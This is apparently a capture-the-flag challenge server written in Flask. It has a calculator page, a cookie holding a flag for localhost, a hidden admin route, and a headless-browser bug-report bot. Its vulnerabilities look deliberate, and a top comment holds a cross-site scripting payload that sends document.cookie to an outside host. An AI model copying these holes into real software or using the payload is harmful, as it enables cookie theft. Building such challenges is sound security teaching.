from flask import Flask, render_template, request, redirect, url_for, make_response
from markupsafe import escape
import shlex, subprocess
from waitress import serve
#2+2, window.location.href = `http://google.com/`+document.cookie

app = Flask(__name__)
PAGE = "http://localhost:8000/"
# Blacklist characters for calculations
BLACKLIST = [';','(', ')']

@app.route('/supersecretadminpanelasdf123456789/<newpage>')
def supersecretpanel(newpage):
    global PAGE
    import base64
    PAGE = base64.b64decode(newpage).decode()
    return PAGE

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/calculate', methods=['GET'])
def calculate():
    expression = escape(request.args['expression'])
    
    # Check for blacklisted characters
    if any(char in expression for char in BLACKLIST):
        return render_template('result.html', expression = expression, error="Blacklisted characters in expression.")
    resp = make_response(render_template('result.html', expression=expression))
    if request.remote_addr == "127.0.0.1":
        resp.set_cookie('adminflag', 'blahaj{3VaL_i5_WeIrD}')
    return resp

@app.route('/bug_report', methods=['GET', 'POST'])
def bug_report():
    global PAGE
    if request.method == 'POST':
        url = request.form['url']
        if url.startswith(PAGE):
            command = f"chromium --virtual-time-budget=10000 --no-sandbox --headless --disable-gpu --timeout=5000 {shlex.quote(url)}"
            subprocess.Popen(command, shell=True)
            return render_template('bug_report.html', success=True, page = PAGE)
        else:
            return render_template('bug_report.html', error="URL must start with '"+PAGE+"'.", page = PAGE)
    
    return render_template('bug_report.html', page = PAGE)

if __name__ == '__main__':
    serve(app, host='0.0.0.0', port=8000)
